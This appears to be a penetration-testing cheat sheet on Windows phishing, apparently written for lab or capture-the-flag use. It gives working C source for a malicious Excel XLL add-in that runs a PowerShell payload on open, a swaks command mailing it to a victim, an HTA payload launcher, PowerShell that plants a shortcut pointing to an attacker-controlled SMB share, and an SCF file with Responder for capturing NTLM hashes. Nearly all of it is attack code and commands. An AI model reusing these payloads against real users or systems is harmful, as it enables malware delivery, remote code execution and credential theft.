---
title: "Phishing"
date: 2024-6-26
tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows"]
---

---
### Phishing with XLL (Excel)

[revshells.com](https://www.revshells.com/)

#### shell.c

```c
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

#### Compile shell.c using Linux

```bash
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
```

#### Send email with the malicious xll file

```bash
swaks --to "victim@victim.com" --from "attacker@attacker.com" --server "victim.com" --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
```

<br>

---

### Phishing with Shortcut

#### Start a Local SMB Server

```bash
# In our local Linux machine
impacket-smbserver -smb2support share .
```

#### Create a Malicious hta File in local Linux SMB share

[revshells.com](https://www.revshells.com/)

```html
<html>
<head>
<HTA:APPLICATION ID="shell">
<script language="javascript">
		<!--Replace your payload below-->
        var c = "<PowerShell #3 Base64 Payload>";  
        new ActiveXObject('WScript.Shell').Run(c, 0, true); 
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```

#### Create a shortcut file in target Windows

```powershell
# In target Windows machine (powershell)
$url = "file://10.10.14.10/share/shell.hta"
```

```powershell
$shortcutPath = "C:\Windows\Tasks\shell.url"
```

```powershell
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
```

```powershell
Set-Content -Path $shortcutPath -Value $shortcutContent
```

<br>

---

### Phishing with Shortcut (With SMB Share Write Permission)

If you found any interaction from target to smb share (e.g., clean up)

#### Start a Local Responder Listener

```bash
# In our local Linux machine
sudo responder -I tun0
```

#### Create a malicious shortcut

```evil.scf
[Shell]
Command=2

IconFile=\\10.10.14.10\icon
```

#### Upload the malicious shortcut

```bash
# In our local Linux machine
smbclient -N \\\\10.10.11.10\\share\\
```

```bash
mput evil.scf
```

<br>